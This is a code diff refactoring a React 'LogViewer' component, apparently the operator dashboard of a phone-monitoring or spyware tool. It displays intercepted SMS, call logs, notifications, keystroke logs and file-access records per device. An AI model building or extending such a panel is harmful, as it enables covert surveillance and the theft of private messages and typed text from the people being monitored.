@@ -1,455 +1,402 @@
 import React, { useState, useEffect } from 'react';
-import { 
-  Box, 
-  Typography, 
-  Paper, 
-  Divider, 
-  CircularProgress,
-  FormControl,
-  InputLabel,
-  Select,
-  MenuItem,
-  Grid,
+import {
+  Box,
+  Typography,
+  Paper,
+  Tab,
+  Tabs,
   Table,
   TableBody,
   TableCell,
   TableContainer,
   TableHead,
   TableRow,
-  Tabs,
-  Tab,
-  IconButton,
-  Tooltip,
-  TextField
+  FormControl,
+  InputLabel,
+  Select,
+  MenuItem,
+  Button,
+  CircularProgress,
+  Alert,
+  TextField,
+  Grid
 } from '@mui/material';
-import { 
-  ChatBubble as SmsIcon, 
-  Phone as CallIcon, 
-  Notifications as NotificationIcon,
-  Keyboard as KeylogIcon,
-  Folder as FileIcon,
-  Refresh as RefreshIcon,
-  DateRange as DateRangeIcon
+import {
+  FilterList as FilterIcon,
+  Refresh as RefreshIcon
 } from '@mui/icons-material';
 import { 
-  getDeviceLogs, 
-  getSmsLogs, 
+  getSmsLogs,
   getCallLogs, 
-  getNotificationLogs, 
-  getKeyLogs, 
-  getFileLogs 
+  getNotificationLogs,
+  getKeyLogs,
+  getFileLogs
 } from '../services/api';
 
-// Log type constants
-const LOG_TYPES = {
-  SMS: 'sms',
-  CALL: 'call',
-  NOTIFICATION: 'notification',
-  KEYLOG: 'keylog',
-  FILE: 'file',
-};
+const timeRanges = [
+  { value: '1h', label: 'Last Hour' },
+  { value: '6h', label: 'Last 6 Hours' },
+  { value: '12h', label: 'Last 12 Hours' },
+  { value: '24h', label: 'Last 24 Hours' },
+  { value: '7d', label: 'Last 7 Days' },
+  { value: '30d', label: 'Last 30 Days' },
+  { value: 'all', label: 'All Time' },
+];
 
 function LogViewer({ devices, selectedDevice, onSelectDevice }) {
-  const [activeTab, setActiveTab] = useState(LOG_TYPES.SMS);
+  const [selectedTab, setSelectedTab] = useState(0);
+  const [selectedTimeRange, setSelectedTimeRange] = useState('24h');
   const [logs, setLogs] = useState([]);
   const [loading, setLoading] = useState(false);
-  const [timeRange, setTimeRange] = useState('24h');
+  const [error, setError] = useState(null);
   const [searchTerm, setSearchTerm] = useState('');
-  
+
   useEffect(() => {
     if (selectedDevice) {
-      fetchLogs(selectedDevice.id, activeTab, timeRange);
+      fetchLogs();
     }
-  }, [selectedDevice, activeTab, timeRange]);
-  
-  const fetchLogs = async (deviceId, logType, range) => {
-    if (!deviceId) return;
+  }, [selectedDevice?.id, selectedTab, selectedTimeRange]);
+
+  const fetchLogs = async () => {
+    if (!selectedDevice) return;
     
     setLoading(true);
+    setError(null);
+    
     try {
       let data = [];
-      
-      switch (logType) {
-        case LOG_TYPES.SMS:
-          data = await getSmsLogs(deviceId, range);
+      switch (selectedTab) {
+        case 0: // SMS
+          data = await getSmsLogs(selectedDevice.id, selectedTimeRange);
           break;
-        case LOG_TYPES.CALL:
-          data = await getCallLogs(deviceId, range);
+        case 1: // Calls
+          data = await getCallLogs(selectedDevice.id, selectedTimeRange);
           break;
-        case LOG_TYPES.NOTIFICATION:
-          data = await getNotificationLogs(deviceId, range);
+        case 2: // Notifications
+          data = await getNotificationLogs(selectedDevice.id, selectedTimeRange);
           break;
-        case LOG_TYPES.KEYLOG:
-          data = await getKeyLogs(deviceId, range);
+        case 3: // Keylog
+          data = await getKeyLogs(selectedDevice.id, selectedTimeRange);
           break;
-        case LOG_TYPES.FILE:
-          data = await getFileLogs(deviceId, range);
+        case 4: // Files
+          data = await getFileLogs(selectedDevice.id, selectedTimeRange);
           break;
         default:
-          data = await getDeviceLogs(deviceId, logType, range);
+          data = [];
       }
-      
-      setLogs(data);
+      setLogs(data || []);
     } catch (error) {
-      console.error(`Error fetching ${logType} logs:`, error);
-      setLogs([]);
+      console.error('Error fetching logs:', error);
+      setError('Failed to fetch logs. Please try again.');
     } finally {
       setLoading(false);
     }
   };
-  
-  const handleRefresh = () => {
-    if (selectedDevice) {
-      fetchLogs(selectedDevice.id, activeTab, timeRange);
+
+  const handleChangeTab = (event, newValue) => {
+    setSelectedTab(newValue);
+  };
+
+  const getLogContent = () => {
+    // If no device is selected, show device selection prompt
+    if (!selectedDevice) {
+      return (
+        <Paper sx={{ p: 2, mt: 2 }}>
+          <Typography align="center" color="text.secondary">
+            Please select a device to view logs
+          </Typography>
+        </Paper>
+      );
     }
-  };
-  
-  const handleTabChange = (_, newValue) => {
-    setActiveTab(newValue);
-  };
-  
-  const handleTimeRangeChange = (event) => {
-    setTimeRange(event.target.value);
-  };
-  
-  const handleSearchChange = (event) => {
-    setSearchTerm(event.target.value);
-  };
-  
-  // Format timestamp
-  const formatDateTime = (timestamp) => {
-    if (!timestamp) return 'N/A';
-    return new Date(timestamp).toLocaleString();
-  };
-  
-  // Filter logs based on search term
-  const filteredLogs = logs.filter(log => {
-    if (!searchTerm) return true;
-    
-    const searchTermLower = searchTerm.toLowerCase();
-    
-    switch (activeTab) {
-      case LOG_TYPES.SMS:
-        return (
-          (log.phoneNumber && log.phoneNumber.includes(searchTermLower)) ||
-          (log.contactName && log.contactName.toLowerCase().includes(searchTermLower)) ||
-          (log.message && log.message.toLowerCase().includes(searchTermLower))
-        );
-      case LOG_TYPES.CALL:
-        return (
-          (log.phoneNumber && log.phoneNumber.includes(searchTermLower)) ||
-          (log.contactName && log.contactName.toLowerCase().includes(searchTermLower))
-        );
-      case LOG_TYPES.NOTIFICATION:
-        return (
-          (log.appName && log.appName.toLowerCase().includes(searchTermLower)) ||
-          (log.title && log.title.toLowerCase().includes(searchTermLower)) ||
-          (log.text && log.text.toLowerCase().includes(searchTermLower))
-        );
-      case LOG_TYPES.KEYLOG:
-        return (
-          (log.application && log.application.toLowerCase().includes(searchTermLower)) ||
-          (log.text && log.text.toLowerCase().includes(searchTermLower))
-        );
-      case LOG_TYPES.FILE:
-        return (
-          (log.path && log.path.toLowerCase().includes(searchTermLower)) ||
-          (log.operation && log.operation.toLowerCase().includes(searchTermLower))
-        );
-      default:
-        return false;
-    }
-  });
-  
-  // Render table based on active tab
-  const renderLogsTable = () => {
+
+    // If loading, show loading indicator
     if (loading) {
       return (
-        <Box display="flex" justifyContent="center" p={4}>
+        <Box sx={{ display: 'flex', justifyContent: 'center', p: 4 }}>
           <CircularProgress />
         </Box>
       );
     }
-    
-    if (!selectedDevice) {
+
+    // If error, show error message
+    if (error) {
       return (
-        <Box p={2} textAlign="center">
-          <Typography variant="body1" color="textSecondary">
-            Please select a device to view logs.
-          </Typography>
-        </Box>
+        <Alert severity="error" sx={{ mt: 2, mb: 2 }}>
+          {error}
+        </Alert>
       );
     }
-    
+
+    // Filter logs based on search term
+    const filteredLogs = logs.filter(log => {
+      if (!searchTerm) return true;
+      
+      const searchLower = searchTerm.toLowerCase();
+      
+      // Different search logic for different log types
+      switch (selectedTab) {
+        case 0: // SMS
+          return (
+            (log.sender || '').toLowerCase().includes(searchLower) ||
+            (log.recipient || '').toLowerCase().includes(searchLower) ||
+            (log.message || '').toLowerCase().includes(searchLower)
+          );
+        case 1: // Calls
+          return (
+            (log.phone_number || '').toLowerCase().includes(searchLower) ||
+            (log.call_type || '').toLowerCase().includes(searchLower) ||
+            (log.contact_name || '').toLowerCase().includes(searchLower)
+          );
+        case 2: // Notifications
+          return (
+            (log.app_name || '').toLowerCase().includes(searchLower) ||
+            (log.title || '').toLowerCase().includes(searchLower) ||
+            (log.content || '').toLowerCase().includes(searchLower)
+          );
+        case 3: // Keylog
+          return (
+            (log.app_name || '').toLowerCase().includes(searchLower) ||
+            (log.text || '').toLowerCase().includes(searchLower)
+          );
+        case 4: // Files
+          return (
+            (log.file_path || '').toLowerCase().includes(searchLower) ||
+            (log.action || '').toLowerCase().includes(searchLower)
+          );
+        default:
+          return true;
+      }
+    });
+
+    // If no logs after filtering, show empty state
     if (filteredLogs.length === 0) {
       return (
-        <Box p={2} textAlign="center">
-          <Typography variant="body1" color="textSecondary">
-            No logs found for the selected device and time range.
-          </Typography>
-        </Box>
+        <Alert severity="info" sx={{ mt: 2 }}>
+          No logs found for the selected criteria.
+        </Alert>
       );
     }
-    
-    switch (activeTab) {
-      case LOG_TYPES.SMS:
-        return (
-          <TableContainer>
-            <Table size="small">
-              <TableHead>
-                <TableRow>
-                  <TableCell>Time</TableCell>
-                  <TableCell>Type</TableCell>
-                  <TableCell>Contact</TableCell>
-                  <TableCell>Message</TableCell>
-                </TableRow>
-              </TableHead>
-              <TableBody>
-                {filteredLogs.map((log, index) => (
-                  <TableRow key={index}>
-                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
-                    <TableCell>{log.type === 'sent' ? 'Outgoing' : 'Incoming'}</TableCell>
-                    <TableCell>
-                      {log.contactName || log.phoneNumber || 'Unknown'}
-                    </TableCell>
-                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
-                      {log.message}
-                    </TableCell>
-                  </TableRow>
-                ))}
-              </TableBody>
-            </Table>
-          </TableContainer>
-        );
-      
-      case LOG_TYPES.CALL:
-        return (
-          <TableContainer>
-            <Table size="small">
-              <TableHead>
-                <TableRow>
-                  <TableCell>Time</TableCell>
-                  <TableCell>Type</TableCell>
-                  <TableCell>Contact</TableCell>
-                  <TableCell>Duration</TableCell>
-                  <TableCell>Status</TableCell>
-                </TableRow>
-              </TableHead>
-              <TableBody>
-                {filteredLogs.map((log, index) => (
-                  <TableRow key={index}>
-                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
-                    <TableCell>
-                      {log.type === 'outgoing' ? 'Outgoing' : log.type === 'incoming' ? 'Incoming' : 'Missed'}
-                    </TableCell>
-                    <TableCell>
-                      {log.contactName || log.phoneNumber || 'Unknown'}
-                    </TableCell>
-                    <TableCell>
-                      {log.duration ? `${Math.round(log.duration / 60)} min ${log.duration % 60} sec` : 'N/A'}
-                    </TableCell>
-                    <TableCell>{log.status || 'N/A'}</TableCell>
-                  </TableRow>
-                ))}
-              </TableBody>
-            </Table>
-          </TableContainer>
-        );
-      
-      case LOG_TYPES.NOTIFICATION:
-        return (
-          <TableContainer>
-            <Table size="small">
-              <TableHead>
-                <TableRow>
-                  <TableCell>Time</TableCell>
-                  <TableCell>App</TableCell>
-                  <TableCell>Title</TableCell>
-                  <TableCell>Text</TableCell>
-                </TableRow>
-              </TableHead>
-              <TableBody>
-                {filteredLogs.map((log, index) => (
-                  <TableRow key={index}>
-                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
-                    <TableCell>{log.appName || 'Unknown'}</TableCell>
-                    <TableCell>{log.title || 'No Title'}</TableCell>
-                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
-                      {log.text || 'No Content'}
-                    </TableCell>
-                  </TableRow>
-                ))}
-              </TableBody>
-            </Table>
-          </TableContainer>
-        );
-      
-      case LOG_TYPES.KEYLOG:
-        return (
-          <TableContainer>
-            <Table size="small">
-              <TableHead>
-                <TableRow>
-                  <TableCell>Time</TableCell>
-                  <TableCell>Application</TableCell>
-                  <TableCell>Input Text</TableCell>
-                </TableRow>
-              </TableHead>
-              <TableBody>
-                {filteredLogs.map((log, index) => (
-                  <TableRow key={index}>
-                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
-                    <TableCell>{log.application || 'Unknown'}</TableCell>
-                    <TableCell sx={{ maxWidth: '400px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
-                      {log.text || 'N/A'}
-                    </TableCell>
-                  </TableRow>
-                ))}
-              </TableBody>
-            </Table>
-          </TableContainer>
-        );
-      
-      case LOG_TYPES.FILE:
-        return (
-          <TableContainer>
-            <Table size="small">
-              <TableHead>
-                <TableRow>
-                  <TableCell>Time</TableCell>
-                  <TableCell>Operation</TableCell>
-                  <TableCell>Path</TableCell>
-                  <TableCell>Size</TableCell>
-                </TableRow>
-              </TableHead>
-              <TableBody>
-                {filteredLogs.map((log, index) => (
-                  <TableRow key={index}>
-                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
-                    <TableCell>{log.operation || 'N/A'}</TableCell>
-                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
-                      {log.path || 'N/A'}
-                    </TableCell>
-                    <TableCell>
-                      {log.size ? `${Math.round(log.size / 1024)} KB` : 'N/A'}
-                    </TableCell>
-                  </TableRow>
-                ))}
-              </TableBody>
-            </Table>
-          </TableContainer>
-        );
-      
+
+    // Render different tables based on log type
+    switch (selectedTab) {
+      case 0: // SMS
+        return renderSmsTable(filteredLogs);
+      case 1: // Calls
+        return renderCallsTable(filteredLogs);
+      case 2: // Notifications
+        return renderNotificationsTable(filteredLogs);
+      case 3: // Keylog
+        return renderKeylogTable(filteredLogs);
+      case 4: // Files
+        return renderFilesTable(filteredLogs);
       default:
         return null;
     }
   };
-  
+
+  const renderSmsTable = (data) => (
+    <TableContainer component={Paper} sx={{ mt: 2 }}>
+      <Table aria-label="SMS logs table">
+        <TableHead>
+          <TableRow>
+            <TableCell>Timestamp</TableCell>
+            <TableCell>Type</TableCell>
+            <TableCell>Sender/Recipient</TableCell>
+            <TableCell>Message</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {data.map((row, index) => (
+            <TableRow key={row.id || index}>
+              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
+              <TableCell>{row.type === 'sent' ? 'Sent' : 'Received'}</TableCell>
+              <TableCell>{row.type === 'sent' ? row.recipient : row.sender}</TableCell>
+              <TableCell>{row.message}</TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </TableContainer>
+  );
+
+  const renderCallsTable = (data) => (
+    <TableContainer component={Paper} sx={{ mt: 2 }}>
+      <Table aria-label="Call logs table">
+        <TableHead>
+          <TableRow>
+            <TableCell>Timestamp</TableCell>
+            <TableCell>Type</TableCell>
+            <TableCell>Contact</TableCell>
+            <TableCell>Duration</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {data.map((row, index) => (
+            <TableRow key={row.id || index}>
+              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
+              <TableCell>
+                {row.call_type === 'incoming' 
+                  ? 'Incoming' 
+                  : row.call_type === 'outgoing' 
+                    ? 'Outgoing' 
+                    : 'Missed'}
+              </TableCell>
+              <TableCell>
+                {row.contact_name || row.phone_number || 'Unknown'}
+              </TableCell>
+              <TableCell>
+                {row.duration ? `${row.duration} seconds` : 'N/A'}
+              </TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </TableContainer>
+  );
+
+  const renderNotificationsTable = (data) => (
+    <TableContainer component={Paper} sx={{ mt: 2 }}>
+      <Table aria-label="Notification logs table">
+        <TableHead>
+          <TableRow>
+            <TableCell>Timestamp</TableCell>
+            <TableCell>App</TableCell>
+            <TableCell>Title</TableCell>
+            <TableCell>Content</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {data.map((row, index) => (
+            <TableRow key={row.id || index}>
+              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
+              <TableCell>{row.app_name || 'Unknown'}</TableCell>
+              <TableCell>{row.title || 'No Title'}</TableCell>
+              <TableCell>{row.content || 'No Content'}</TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </TableContainer>
+  );
+
+  const renderKeylogTable = (data) => (
+    <TableContainer component={Paper} sx={{ mt: 2 }}>
+      <Table aria-label="Keylog table">
+        <TableHead>
+          <TableRow>
+            <TableCell>Timestamp</TableCell>
+            <TableCell>App</TableCell>
+            <TableCell>Text</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {data.map((row, index) => (
+            <TableRow key={row.id || index}>
+              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
+              <TableCell>{row.app_name || 'Unknown'}</TableCell>
+              <TableCell>{row.text || ''}</TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </TableContainer>
+  );
+
+  const renderFilesTable = (data) => (
+    <TableContainer component={Paper} sx={{ mt: 2 }}>
+      <Table aria-label="File access logs table">
+        <TableHead>
+          <TableRow>
+            <TableCell>Timestamp</TableCell>
+            <TableCell>Action</TableCell>
+            <TableCell>File Path</TableCell>
+            <TableCell>App</TableCell>
+          </TableRow>
+        </TableHead>
+        <TableBody>
+          {data.map((row, index) => (
+            <TableRow key={row.id || index}>
+              <TableCell>{new Date(row.timestamp).toLocaleString()}</TableCell>
+              <TableCell>{row.action || 'Unknown'}</TableCell>
+              <TableCell>{row.file_path || 'Unknown'}</TableCell>
+              <TableCell>{row.app_name || 'Unknown'}</TableCell>
+            </TableRow>
+          ))}
+        </TableBody>
+      </Table>
+    </TableContainer>
+  );
+
   return (
-    <Box>
-      <Paper sx={{ mb: 3 }}>
-        <Box p={2} bgcolor="primary.main" color="white" display="flex" justifyContent="space-between" alignItems="center">
-          <Typography variant="h6">
-            Log Viewer
-          </Typography>
-          
-          <Box display="flex" alignItems="center">
-            <FormControl size="small" variant="outlined" sx={{ minWidth: 150, bgcolor: 'white', borderRadius: 1, mx: 1 }}>
-              <InputLabel id="device-select-label">Device</InputLabel>
-              <Select
-                labelId="device-select-label"
-                value={selectedDevice ? selectedDevice.id : ''}
-                onChange={(e) => {
-                  const device = devices.find(d => d.id === e.target.value);
-                  if (device) onSelectDevice(device);
+    <Box sx={{ p: 2 }}>
+      <Typography variant="h6" gutterBottom>
+        Device Logs
+      </Typography>
+      
+      <Paper>
+        <Tabs 
+          value={selectedTab} 
+          onChange={handleChangeTab}
+          variant="scrollable"
+          scrollButtons="auto"
+          aria-label="log types tabs"
+        >
+          <Tab label="SMS" />
+          <Tab label="Calls" />
+          <Tab label="Notifications" />
+          <Tab label="Keylog" />
+          <Tab label="Files" />
+        </Tabs>
+        
+        <Box sx={{ p: 2 }}>
+          <Grid container spacing={2} alignItems="center">
+            <Grid item xs={12} sm={4} md={3}>
+              <FormControl fullWidth size="small">
+                <InputLabel id="time-range-label">Time Range</InputLabel>
+                <Select
+                  labelId="time-range-label"
+                  value={selectedTimeRange}
+                  onChange={(e) => setSelectedTimeRange(e.target.value)}
+                  label="Time Range"
+                >
+                  {timeRanges.map((range) => (
+                    <MenuItem key={range.value} value={range.value}>
+                      {range.label}
+                    </MenuItem>
+                  ))}
+                </Select>
+              </FormControl>
+            </Grid>
+            
+            <Grid item xs={12} sm={6} md={7}>
+              <TextField
+                fullWidth
+                size="small"
+                label="Search logs"
+                variant="outlined"
+                value={searchTerm}
+                onChange={(e) => setSearchTerm(e.target.value)}
+                InputProps={{
+                  startAdornment: <FilterIcon fontSize="small" sx={{ mr: 1, color: 'action.active' }} />,
                 }}
-                label="Device"
-              >
-                {devices.map((device) => (
-                  <MenuItem key={device.id} value={device.id}>
-                    {device.model || 'Unknown'} - {device.id.substring(0, 8)}...
-                  </MenuItem>
-                ))}
-              </Select>
-            </FormControl>
+              />
+            </Grid>
             
-            <FormControl size="small" variant="outlined" sx={{ minWidth: 120, bgcolor: 'white', borderRadius: 1 }}>
-              <InputLabel id="time-range-label">Time Range</InputLabel>
-              <Select
-                labelId="time-range-label"
-                value={timeRange}
-                onChange={handleTimeRangeChange}
-                label="Time Range"
+            <Grid item xs={12} sm={2} md={2}>
+              <Button
+                fullWidth
+                variant="outlined"
+                color="primary"
+                startIcon={loading ? <CircularProgress size={20} /> : <RefreshIcon />}
+                onClick={fetchLogs}
+                disabled={loading || !selectedDevice}
               >
-                <MenuItem value="24h">Last 24 Hours</MenuItem>
-                <MenuItem value="7d">Last 7 Days</MenuItem>
-                <MenuItem value="30d">Last 30 Days</MenuItem>
-                <MenuItem value="all">All Time</MenuItem>
-              </Select>
-            </FormControl>
-            
-            <Tooltip title="Refresh">
-              <IconButton color="inherit" onClick={handleRefresh} sx={{ ml: 1 }}>
-                <RefreshIcon />
-              </IconButton>
-            </Tooltip>
-          </Box>
-        </Box>
-        <Divider />
-        
-        <Box>
-          <Tabs
-            value={activeTab}
-            onChange={handleTabChange}
-            variant="scrollable"
-            scrollButtons="auto"
-            allowScrollButtonsMobile
-          >
-            <Tab 
-              icon={<SmsIcon />} 
-              label="SMS" 
-              value={LOG_TYPES.SMS} 
-              iconPosition="start" 
-            />
-            <Tab 
-              icon={<CallIcon />} 
-              label="Calls" 
-              value={LOG_TYPES.CALL} 
-              iconPosition="start" 
-            />
-            <Tab 
-              icon={<NotificationIcon />} 
-              label="Notifications" 
-              value={LOG_TYPES.NOTIFICATION} 
-              iconPosition="start" 
-            />
-            <Tab 
-              icon={<KeylogIcon />} 
-              label="Key Logs" 
-              value={LOG_TYPES.KEYLOG} 
-              iconPosition="start" 
-            />
-            <Tab 
-              icon={<FileIcon />} 
-              label="File Access" 
-              value={LOG_TYPES.FILE} 
-              iconPosition="start" 
-            />
-          </Tabs>
-        </Box>
-        
-        <Box p={2}>
-          <TextField
-            fullWidth
-            variant="outlined"
-            size="small"
-            label="Search Logs"
-            value={searchTerm}
-            onChange={handleSearchChange}
-            sx={{ mb: 2 }}
-            placeholder="Search by content, contact name, phone number, etc."
-          />
-          {renderLogsTable()}
+                Refresh
+              </Button>
+            </Grid>
+          </Grid>
+          
+          {getLogContent()}
         </Box>
       </Paper>
     </Box>
